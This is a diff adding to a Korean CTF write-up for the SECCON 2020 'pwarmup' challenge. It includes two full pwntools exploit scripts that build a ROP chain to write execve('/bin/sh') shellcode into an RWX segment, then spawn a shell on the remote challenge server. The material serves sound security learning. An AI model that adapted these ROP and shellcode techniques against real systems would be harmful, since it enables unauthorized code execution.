@@ -1,7 +1,6 @@
 # pwarmup
 ### #rwx_segment #rop #pwn #pwntools
 
-***\* 해당 [write up](https://github.com/mephi42/ctf/blob/master/2020.10.10-SECCON_2020_Online_CTF/pwarmup/pwnit.py) 을 참고하여 재정리***
 
 
 rop 상황에서 pwntools 의 사용을 극대화 시킬 수 있었던 문제. 
@@ -56,7 +55,98 @@ void setup(void) {
 ![res](../../.images/pwarmup4.png)
 
 
+```python
+from pwn import *
+context.arch='amd64'
+elf=ELF("./chall")
+scanf_plt=elf.plt['__isoc99_scanf']
+scanf_arg0=0x40081B # "%s"
+prdi=0x4007e3
+prsi=0x4007e1
+rwx=0x600000 # ~~ELF~~~ => starting point of binary
+shellcode="\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"
+#s=process("./chall")
+s=remote('pwn-neko.chal.seccon.jp',9001)
+pause()
+payload=b"a"*40
+payload+=p64(prdi)
+payload+=p64(scanf_arg0)
+payload+=p64(prsi)
+payload+=p64(rwx)
+payload+=p64(0xdeadbeef)
+payload+=p64(scanf_plt)
+payload+=p64(rwx)
+s.sendline(payload) # scanf in 0x600000 (rwx segment)
+s.sendline(shellcode) # shellcode in 0x600000
+s.interactive()
+```
 
+
+
+***\* 해당 [write up](https://github.com/mephi42/ctf/blob/master/2020.10.10-SECCON_2020_Online_CTF/pwarmup/pwnit.py) 을 참고하여 추가정리***
+
+막판에 `stdout` 을 대처하는 방법이 위 링크에 있었다.
+
+glibc 함수 중에는 인자로 오는 파일 디스크립터를 복붙해주는 `dup(arg)` 함수가 있는데, 이를 `stdin` 을 인자로 하여 syscall 로 호출하면 `stdout` 이 사용하는 1번 파일 디스크립터에 `stdin` 이 복사되어 소켓통신 중에 출력을 온전하게 볼 수 있다.
+해당 풀이자의 익스 코드는 아래와 같다.
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+
+BINARY = 'pwarmup/chall'
+
+
+def connect():
+    if args.LOCAL:
+        return gdb.debug([BINARY], gdbscript='''
+b *0x400707
+c
+''')
+    else:
+        return remote('pwn-neko.chal.seccon.jp', 9001)
+
+
+def main():
+    context.arch = 'amd64'
+    percent_s = 0x40081B
+    rwx = 0x600000
+    rop = ROP([ELF(BINARY)])
+    rop.call('__isoc99_scanf', [percent_s, rwx])
+    rop.raw(rwx)
+    rop = rop.chain()
+    shellcode = asm(
+        '''mov rax, 31
+        inc rax
+        xor rdi, rdi
+        syscall
+''' +
+        shellcraft.amd64.linux.sh(),
+        arch='amd64')
+    #main_addr = 0x4006B7
+    #puts_plt_addr = 0x400580
+    #pop_rdi_ret_addr = 0x4007e3
+    #puts_got_addr = 0x4006B7  # 0x600BB8
+    whitespace = b'\x0a\x0b\x20'
+    assert all(c not in rop for c in whitespace)
+    assert all(c not in shellcode for c in whitespace)
+    with connect() as tube:
+        tube.sendline(flat({0x28: rop}))
+        tube.sendline(shellcode)
+        tube.interactive()  # SECCON{1t's_g3tt1ng_c0ld_1n_j4p4n_d0n't_f0rget_t0_w4rm-up}
+
+
+if __name__ == '__main__':
+    main()
+```
+
+.
+
+.
+
+.
+
+**Contact:** a42873410@gmail.com
 
 
 
